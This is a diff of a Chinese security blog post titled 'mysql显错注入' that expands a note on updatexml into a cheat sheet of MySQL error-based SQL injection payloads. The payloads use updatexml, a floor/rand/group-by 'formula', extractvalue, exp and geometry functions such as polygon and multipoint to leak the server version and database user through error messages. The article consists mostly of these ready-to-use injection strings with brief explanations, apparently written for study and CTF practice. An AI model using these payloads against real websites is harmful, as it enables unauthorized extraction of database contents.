@@ -3,19 +3,24 @@
 <head>
   <meta charset="utf-8">
   
-  <title>updatexml mysql显错注入 | Err0r</title>
+  <title>mysql显错注入 | Err0r</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="在学习之前，先了解一下updatexml用法:">
+  <meta name="description" content="整理一下那些报错注入的函数吧">
 <meta property="og:type" content="article">
-<meta property="og:title" content="updatexml mysql显错注入">
+<meta property="og:title" content="mysql显错注入">
 <meta property="og:url" content="http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/index.html">
 <meta property="og:site_name" content="Err0r">
-<meta property="og:description" content="在学习之前，先了解一下updatexml用法:">
+<meta property="og:description" content="整理一下那些报错注入的函数吧">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-10-31T08:57:28.497Z">
+<meta property="og:image" content="https://i.imgur.com/t4bx8Je.png">
+<meta property="og:image" content="https://i.imgur.com/N5CsyQo.png">
+<meta property="og:image" content="https://i.imgur.com/zriO4fi.png">
+<meta property="og:image" content="https://i.imgur.com/mTPTJNt.png">
+<meta property="og:updated_time" content="2017-11-23T03:35:59.469Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="updatexml mysql显错注入">
-<meta name="twitter:description" content="在学习之前，先了解一下updatexml用法:">
+<meta name="twitter:title" content="mysql显错注入">
+<meta name="twitter:description" content="整理一下那些报错注入的函数吧">
+<meta name="twitter:image" content="https://i.imgur.com/t4bx8Je.png">
   
     <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
   
@@ -180,7 +185,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      updatexml mysql显错注入
+      mysql显错注入
     </h1>
   
 
@@ -197,13 +202,25 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>在学习之前，先了解一下updatexml用法:</p>
+        <p>整理一下那些报错注入的函数吧</p>
 <a id="more"></a>
-<p>updatexml(xml_document,xpath_string,new_value);<br>第一个参数:xml_documnet是String格式，为XML文档对象的名称，文中为Doc。<br>第二个参数:xpath_string(xpath格式的字符串),如果不了解xpath语法,可以在网上查找教程。<br>第三个参数:new_value,string格式,替换查找到的符合条件的数据。</p>
+<p>报错注入的前提条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，</div><div class="line">它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解</div></pre></td></tr></table></figure></p>
+<h1 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h1><p>updatexml(xml_document,xpath_string,new_value);<br>第一个参数:xml_documnet是String格式，为XML文档对象的名称，文中为Doc。<br>第二个参数:xpath_string(xpath格式的字符串),如果不了解xpath语法,可以在网上查找教程。<br>第三个参数:new_value,string格式,替换查找到的符合条件的数据。</p>
 <p>然后咋们再看看语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</div></pre></td></tr></table></figure></p>
 <p><code>concat(str1,str2,...)</code><br>返回结果为连接参数产生的字符串。如有任何一个参数为null，则返回值为null。</p>
 <p>通过查询@@version,返回版本。然后<code>concat</code>将其字符串化。因为<code>updatexml</code>第二个参数需要xpath格式的字符串,所以不符合要求，然后报错。</p>
 <p>错误大概会是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<h1 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h1><p>利用方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">count(*)、rand()、group by三者缺一不可</div><div class="line">报错注入用一个公式，只要套用公式即可，公式如下:</div><div class="line">?id=2&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a</div><div class="line">)--+</div></pre></td></tr></table></figure></p>
+<p>公式解析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">floor()是取整数</div><div class="line">rand()在0和1之间产生一个随机数</div><div class="line">rand(0)*2将取0到2的随机数</div><div class="line">floor(rand()*2)有两条记录就会报错</div><div class="line">floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的</div><div class="line">count(*)是用来统计结果的，相当于刷新一次结果</div><div class="line">group by在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1</div><div class="line">在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</div></pre></td></tr></table></figure></p>
+<p><br><br>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id = 1 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/t4bx8Je.png" alt=""></p>
+<h1 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id = 1 and (extractvalue(1, concat(0x5c,(select user()))))</div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/N5CsyQo.png" alt=""><br><br></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id =1 and EXP(~(SELECT * from(select user())a))</div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/zriO4fi.png" alt=""></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">GeometryCollection()</div><div class="line">id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</div><div class="line"></div><div class="line">polygon()</div><div class="line">id =1 AND polygon((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multipoint()</div><div class="line">id = 1 AND multipoint((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multilinestring()</div><div class="line">id = 1 AND multilinestring((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">linestring()</div><div class="line">id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multipolygon()</div><div class="line">id =1 AND multipolygon((select * from(select * from(select user())a)b))</div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/mTPTJNt.png" alt=""></p>
 
       
       
@@ -259,12 +276,12 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/10/31/updatexml-mysql显错注入/">updatexml mysql显错注入</a></p>
+        <p><span>本文标题:</span><a href="/2017/10/31/updatexml-mysql显错注入/">mysql显错注入</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
         <p><span>发布时间:</span>2017年10月31日 - 14时51分</p>
-        <p><span>最后更新:</span>2017年10月31日 - 16时57分</p>
+        <p><span>最后更新:</span>2017年11月23日 - 11时35分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/10/31/updatexml-mysql显错注入/" title="updatexml mysql显错注入">http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/</a>
+            <span>原始链接:</span><a class="post-url" href="/2017/10/31/updatexml-mysql显错注入/" title="mysql显错注入">http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/</a>
             <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
@@ -300,7 +317,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#updatexml"><span class="toc-number">1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#floor"><span class="toc-number">2.</span> <span class="toc-text">floor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#extractvalue"><span class="toc-number">3.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他"><span class="toc-number">5.</span> <span class="toc-text">其他</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -377,7 +394,7 @@
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/OOB注入/">OOB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/sage安装/">sage安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/CTF中RSA套路/">CTF中RSA套路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/GET的命令执行漏洞/">GET的命令执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/13/ctf命令执行与绕过/">ctf命令执行与绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/09/无线破解浅谈/">无线破解浅谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/07/浅谈php安全/">浅谈php安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/updatexml-mysql显错注入/">updatexml mysql显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/26/typecho-backdoor/">typecho backdoor</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/问鼎杯决赛/">问鼎杯决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/常用正则表达式/">常用正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/问鼎杯线上/">问鼎杯writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/jarvisoj/">javrisoj的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/04/injection/">各种注入姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/Padding-Oracle-攻击/">Padding_Oracle 攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/爆破脚本/">爆破脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/OOB注入/">OOB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/sage安装/">sage安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/CTF中RSA套路/">CTF中RSA套路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/GET的命令执行漏洞/">GET的命令执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/13/ctf命令执行与绕过/">ctf命令执行与绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/09/无线破解浅谈/">无线破解浅谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/07/浅谈php安全/">浅谈php安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/updatexml-mysql显错注入/">mysql显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/26/typecho-backdoor/">typecho backdoor</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/问鼎杯决赛/">问鼎杯决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/常用正则表达式/">常用正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/问鼎杯线上/">问鼎杯writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/jarvisoj/">javrisoj的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/04/injection/">各种注入姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
